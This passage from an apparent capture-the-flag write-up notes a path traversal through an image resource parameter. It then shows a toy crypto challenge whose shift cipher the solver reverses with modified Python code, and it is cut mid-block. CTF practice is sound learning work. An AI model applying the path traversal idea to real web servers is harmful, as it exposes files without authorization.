we see that the image resouce takes an image parameter that is limited to image extentions, so we use that as our path traversal point

### Crypto/icvc

given the following code
```
state = 1
flag = "[REDACTED]"
alphabet = "abcdefghijklmnopqrstuvwxyz"
assert(flag[0:5]+flag[-1]=="flag{}")
ciphertext = ""
for character in flag[5:-1]:
    state = (15*state+18)%29
    ciphertext+=alphabet[(alphabet.index(character)+state)%26]
print(ciphertext)
```
we tamper with it and write the following
```
state = 1
flag = "[REDACTED]"
alphabet = "abcdefghijklmnopqrstuvwxyz"
# assert(flag[0:5]+flag[-1]=="flag{}")
tmp = ""
ciphertext = "mawhxyovhiiupukqnzdekudetmjmefkqjgmqndgtnrxqxludegwovdcdmjjhw"
tmpflag=''

for character in ciphertext:
    state = (15*state+18)%29
    tmp+=alphabet[(alphabet.index(character)-state)%26]
print(tmp)
